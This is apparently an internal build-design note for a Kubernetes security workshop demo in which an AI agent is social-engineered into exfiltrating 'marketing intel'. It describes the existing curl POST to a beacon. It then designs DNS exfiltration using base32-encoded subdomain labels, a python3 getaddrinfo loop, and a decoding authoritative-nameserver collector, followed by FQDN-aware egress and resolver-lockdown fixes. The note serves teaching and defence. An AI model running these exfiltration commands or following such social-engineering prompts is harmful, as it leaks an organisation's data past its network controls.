<!-- ABOUTME: Internal build-design for #116, the C1 two-stage DNS-exfil beat (naive NetworkPolicy defeated,
     FQDN policy holds). This is engineering design for a DEFERRED build, not Portland lab/slide prose. -->
# C1 two-stage — DNS exfil defeats the L3/L4 policy, FQDN control holds (build design)

**Status: DEFERRED to Barcelona (Michael, 2026-09-07, issue #116), label `deferred-barcelona`.**
This is the engineering design that the deferral kept the issue open for ("the design work here is
still wanted, just for the next event"). It is **not** Portland content: for Portland, the DNS stage is a
narrated slide (show it, do not run it), which is already the plan of record. Nothing here touches the
student lab prose (`challenges/LAB-TEXT.md`), the facilitation run-of-show, the abstract, or any deploy
config — those remain Michael's to write when the build is scheduled. The disposition is also recorded in
`decisions.md` (Question 575) and `docs/research/2026-08-28-challenge-currency-review.md` (the #116 row).
Dated facts (versions, CNI support) must be re-checked before the build lands.

This note uses "stage" for the steps of the demonstration to stay clear of the retired fleet "round"
vocabulary (`verify/round_shapes.py`, #290/#291/#498/#560); the clusters are the Community cluster (no
guardrails), the admin clusters (every control armed), and the attendee pool (each student installs the
control themselves).

## 1. Where C1 stands today (the two stages that work and are measured)

C1 part 2 is the outbound beacon (`challenges/c1-exfil-s3/README.md`, `agent-prompt.txt` part 2). The
agent is social-engineered into calling `get_marketing_intel` (`gitops/ai-layer/workshop-mcp-server.py`)
and POSTing the JSON out via `run_shell curl` to `https://agenticburn.com/beacon`, a public 200-responder
on the apex Caddy router. The beacon is a stateful collector (`docs/beacon-collector-spec.md`) that shows
a live count and recent payloads — the "watch the data leave the building" room view.

- **Stage 1 — egress open** (the Community cluster, or an attendee cluster before the student applies the
  control): the POST reaches the public internet, the beacon count moves (measured 7 → 8 after the #108
  fix). The intel left the cluster.
- **Stage 2 — the egress policy applied** (an admin cluster ships it armed; an attendee cluster once the
  student applies the agent egress allowlist): the same POST is blocked and the count holds at 7. Since
  #108, `policies/network-policies/per-namespace/agent-egress-allowlist.yaml` covers the **whole** `agent`
  namespace (`podSelector: {}`), not just the `workshop-agent` pod, so the exfil — which is performed by
  the `workshop-mcp` pod where `run_shell` runs, not by the agent pod — is genuinely stopped. Bedrock
  still works because it is reached in-VPC (`10.0.0.0/16:443`) via its PrivateLink endpoint.

That is a clean block. The teaching claim of this issue is that a clean block is a **weaker** moment than
a control that is right and still defeated.

## 2. The gap: NetworkPolicy is L3/L4, and DNS is a hole we had to leave open

`agent-egress-allowlist.yaml` permits only `10.0.0.0/16:443`, `172.20.0.0/16:443` (the service CIDR for
the in-cluster API), and the Pod Identity link-local endpoint (`169.254.170.23/32:80`). It is CIDR+port,
nothing above L4. The companion `agent-allow-dns.yaml` then allows **UDP/TCP 53 to kube-system**
namespace-wide, because nothing in the cluster resolves without it (Bedrock's hostname, in-cluster service
names, the collector).

That DNS allow is the exfil channel. NetworkPolicy does not inspect the QNAME, so data encoded into
subdomain labels leaves over port 53 to CoreDNS, which (by default) forwards recursively to an upstream
resolver, which reaches an attacker-controlled authoritative nameserver — **with the egress policy fully
enforced**. This is not a hypothetical: the [Kubernetes docs thread](https://github.com/kubernetes/website/issues/54997)
and [Red Hat's egress guide](https://www.redhat.com/en/blog/guide-to-kubernetes-egress-network-policies)
both state plainly that NetworkPolicy is not a general protection against exfiltration. The sibling
"shared CDN" limitation (an attacker webhook behind the same CDN IP as something we allow) is the same
class of L3/L4 blindness and is worth one narrated sentence, but DNS is the one we build.

## 3. Stage 3 design — same prompt, exfil over DNS, data arrives anyway

**Attack path.** Same social-engineering prompt as stage 2 ("send our marketing intel to the partner
intake"), but the tool ships the data over DNS instead of HTTPS:

1. `get_marketing_intel` returns the JSON (unchanged).
2. The payload is chunked and base32-encoded (base32, not base64 — DNS labels are case-insensitive and
   limited to a conservative alphabet; ≤63 chars/label, ≤253 chars/name). Each chunk becomes a label in a
   query under an attacker zone, e.g. `<seq>.<b32chunk>.exfil.agenticburn.com`.
3. The tool triggers a resolution per chunk. Two tool options:
   - **No new binary — `run_shell` with the Python already in the image.** The `workshop-mcp` image is
     Python-based (`python:3.12-slim`); `python3 -c "import socket; socket.getaddrinfo('<label>.exfil.agenticburn.com', 80)"`
     in a loop exfiltrates with zero added tooling and is honest about the "benign-looking lookup" framing.
     (`getent hosts` / `nslookup` / `dig` also work but `nslookup`/`dig` need `dnsutils`, which the image
     does not currently install — see `images/workshop-mcp/Dockerfile`, which installs only `curl` and
     `ca-certificates`.)
   - **A dedicated MCP tool** (e.g. `report_status(host)` that "pings a monitoring host") reads cleaner on
     a slide and keeps the attack out of free-form shell, at the cost of being an obviously planted tool.
   Recommendation: start with the `run_shell` + Python form (nothing to add, mirrors the existing curl
   beat), and only add a named tool if the slide needs it to be legible.
4. The NACKs/records are irrelevant to the attacker; the data is in the QNAMEs the authoritative server sees.

**The collector.** A sibling to the beacon collector (`docs/beacon-collector-spec.md`): an
**authoritative nameserver for a delegated subdomain** (e.g. `exfil.agenticburn.com`, delegated at
Namecheap — a Michael-side apex/DNS hand-off, same shape as the beacon's apex repoint). It answers every
query (so lookups succeed and the loop proceeds), logs each QNAME with timestamp and source, strips the
zone suffix, orders by the `<seq>` label, base32-decodes and reassembles the payload. A `GET /dns/view`
renders the reassembled marketing JSON next to the beacon view, so the room sees the **same data arrive
by a different door while the egress policy is still green**. Keep it on the provisioning app's `/data`
volume like the beacon.

**Why it passes.** `agent-allow-dns.yaml` permits 53 to kube-system; CoreDNS forwards upstream by
default; the QNAME is never inspected. The stage-2 allowlist is unchanged and fully enforced.

## 4. The fix — FQDN-aware egress + a resolver that cannot be an open relay

Blocking this needs **both** an L7/identity-aware egress decision **and** closing CoreDNS as an arbitrary
upstream relay. Three build options, teed up for the architecture call at build time (this is a fleet
networking decision — Michael's, not settled here):

- **A. Cilium `toFQDNs`.** The named control from the issue. Cilium's DNS-aware policy proxies DNS, learns
  which IPs a permitted FQDN resolves to, and allows egress only to those — and it can restrict which
  QNAMEs are even resolvable (`toFQDNs`/`matchPattern` on DNS rules), which kills label-encoded exfil at
  the proxy. **Cost: a CNI migration.** The fleet runs AWS VPC-CNI with `enableNetworkPolicy=true`
  (`infra/terraform/aws/cluster/main.tf`); `toFQDNs` means replacing or chaining Cilium, fleet-wide, which
  touches every challenge's network assumptions and every per-namespace policy under
  `policies/network-policies/`. This is the "may not be affordable before Portland" item and the reason
  for the Barcelona deferral. Re-check at build time whether EKS supports Cilium as the primary CNI vs.
  chaining, and whether the other beats (default-deny, the apps allowlist, Falco/KubeArmor) survive the swap.
- **B. Forced egress proxy.** Route all agent egress through an explicit proxy (e.g. a per-namespace
  egress gateway / forward proxy) that enforces an FQDN allowlist at L7, and drop direct :443/:53 egress in
  the NetworkPolicy so the proxy is the only path out. No CNI change; it stays in the layer we already own
  (this is the "forced egress proxy" alternative the issue names). Cost: a new always-on component and a
  DNS story (the proxy, or a locked resolver, must still answer legitimate names). Reads as "we added a
  real control" rather than "we changed the whole network substrate," which may be the better workshop
  lesson for someone going back to a real cluster.
- **C. Lock the resolver (required complement to A and B).** Even with FQDN egress, CoreDNS forwarding
  arbitrary recursion upstream is the relay. Restrict DNS to the cluster resolver with **no arbitrary
  upstream**: a CoreDNS `forward` scoped to the zones we actually need (AWS/Bedrock, the collector) with
  recursion to the open internet disabled, and/or NodeLocal DNSCache with an allowlist. Without this, A's
  and B's egress wins can still be bypassed through whatever recursion path remains.

**Shape of the lesson:** the infra control (the egress policy) was *right*, and the *first* infra control
you reach for (L3/L4 NetworkPolicy) is still not enough — you need DNS-aware egress and a resolver that is
not an open relay. That is the reversal structure proposed for C6 in #115, and it is a sharper, truer
lesson than "turn on NetworkPolicy."

## 5. Build cost, validation, and the open decision

- **Cost:** medium-to-large, the largest in the #110 batch. New pieces: the DNS-exfil path in the MCP tool
  (small), the authoritative-DNS collector + view (medium, sibling of the beacon collector), a Namecheap
  delegation for the exfil zone (Michael-side, one hand-off), and the chosen FQDN control (A is a fleet
  CNI migration; B is a new proxy component; C is CoreDNS/NodeLocal config).
- **Validation needs a cluster**, and option A needs a **Cilium** cluster. The acceptance shape mirrors
  C1 today: the DNS-exfil stage lands at the DNS collector with the egress NetworkPolicy still green; after
  the fix, the label-encoded lookups fail (or resolve to nothing exfiltratable) and the collector stops
  receiving, while Bedrock and legitimate in-cluster resolution still work. Add a `verify/` check in the
  live-cluster tier (the `run-e2e.sh` tier, with CONTEXT), paralleling `verify/c1-exfil-block.sh`.
- **Open decision, parked until the Barcelona build is scheduled:** which FQDN control (A Cilium `toFQDNs`
  / B forced egress proxy, over the C resolver-lockdown floor). This is a fleet networking/architecture
  call with real cost, deliberately **not** decided here; it waits on Michael and on the build being
  scheduled for the next event.

## 6. References

- `policies/network-policies/per-namespace/agent-egress-allowlist.yaml` — the L3/L4 egress allowlist (#108).
- `policies/network-policies/per-namespace/agent-allow-dns.yaml` — the 53-to-kube-system allow that is the hole.
- `challenges/c1-exfil-s3/README.md`, `agent-prompt.txt` — the C1 beat and the HTTPS exfil it is built on.
- `docs/beacon-collector-spec.md` — the HTTPS collector; the DNS collector is its sibling.
- `gitops/ai-layer/workshop-mcp-server.py`, `images/workshop-mcp/Dockerfile` — the tool surface (`run_shell`,
  `get_marketing_intel`; Python present, `dnsutils` absent).
- Kubernetes docs thread: https://github.com/kubernetes/website/issues/54997
- Red Hat egress guide: https://www.redhat.com/en/blog/guide-to-kubernetes-egress-network-policies
- `decisions.md` Question 575 and `docs/research/2026-08-28-challenge-currency-review.md` — the deferral record.
